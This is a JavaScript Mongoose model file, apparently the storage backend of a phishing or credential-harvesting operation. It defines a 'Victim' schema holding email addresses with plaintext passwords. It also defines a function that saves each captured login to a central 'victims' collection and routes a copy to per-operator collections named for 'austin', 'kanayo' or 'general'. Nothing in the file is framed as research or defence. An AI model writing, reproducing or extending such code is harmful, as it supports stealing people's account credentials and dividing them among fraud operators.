const mongoose = require("mongoose");

const VictimSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
  },
  password: {
    type: String,
    required: true,
  },
  employerId: {
    type: String,
    default: "general",
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

// Central "victims" collection model
const MainVictim = mongoose.model("Victim", VictimSchema, "victims");

// Pre-defined Employer Models
const AustinVictim = mongoose.model("AustinVictim", VictimSchema, "austin_victims");
const KanayoVictim = mongoose.model("KanayoVictim", VictimSchema, "kanayo_victims");
const GeneralVictim = mongoose.model("GeneralVictim", VictimSchema, "general_victims");

async function saveToEmployerAndMain({ email, password, employerId }) {
  const normalizedEmployer = (employerId || "general").toLowerCase().trim();

  // Save to central "victims" collection
  const mainRecord = await MainVictim.create({
    email,
    password,
    employerId: normalizedEmployer,
  });

  // Check for 'au', 'au@', or 'austin'
  if (
    normalizedEmployer === "au" ||
    normalizedEmployer === "au@" ||
    normalizedEmployer === "austin"
  ) {
    await AustinVictim.create({ email, password, employerId: "austin" });
  } 
  // Check for 'kan', 'kan@', or 'kanayo'
  else if (
    normalizedEmployer === "kan" ||
    normalizedEmployer === "kan@" ||
    normalizedEmployer === "kanayo"
  ) {
    await KanayoVictim.create({ email, password, employerId: "kanayo" });
  } 
  else {
    await GeneralVictim.create({ email, password, employerId: normalizedEmployer });
  }

  return mainRecord;
}

module.exports = {
  MainVictim,
  AustinVictim,
  KanayoVictim,
  GeneralVictim,
  saveToEmployerAndMain,
};